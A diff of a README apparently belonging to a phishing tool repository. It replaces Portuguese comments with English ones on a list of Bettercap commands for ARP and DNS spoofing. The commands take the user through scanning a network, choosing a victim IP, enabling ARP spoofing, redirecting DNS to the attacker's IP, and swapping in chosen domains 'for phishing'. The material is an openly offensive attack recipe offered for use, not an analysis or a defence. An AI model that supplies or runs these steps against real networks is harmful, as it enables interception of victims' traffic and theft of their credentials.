@@ -14,12 +14,8 @@ https://github.com/0ruguri0/phispytool/assets/150361492/dd29becd-55dd-4c15-a5b8-
 
 # #Commands
 
-Comandos Do Bettercap para ARP & DNS Spoof
 
-NET.RECON ON/OFF	                                    // #Inicialize a varredura de rede para marcar a máquina em "uso", máquina do invasor e da vítima
-
-NEW.SHOW + set arp.spoof.targets (Ip da Vitima)       // #Visualize máquinas e defina a máquina da vítima
-
-ARP.SPOOF ON + set dns.spoof.adress (Ip do Atacante)	// #Habilite o Spoof e defina o IP de redirecionamento do Spoof
-
-set dns.spoof.domains (Dominio Desejado para Trocar)	// #Definir DOMÍNIO (TROCA POR PHISHING)
+NET.RECON ON/OFF 	                                    // Initialize Network Scan to mark machine in "use", Attacker and Victim machine
+NEW.SHOW + set arp.spoof.targets (Ip da Vitima) 	    // View machines, and define the victim's machine
+ARP.SPOOF ON + set dns.spoof.adress (Ip do Atacante) 	// Enable Spoof and set Spoof Redirection IP
+set dns.spoof.domains (Dominio Desejado para Trocar) 	// Set DOMAIN (EXCHANGE FOR PHISHING)
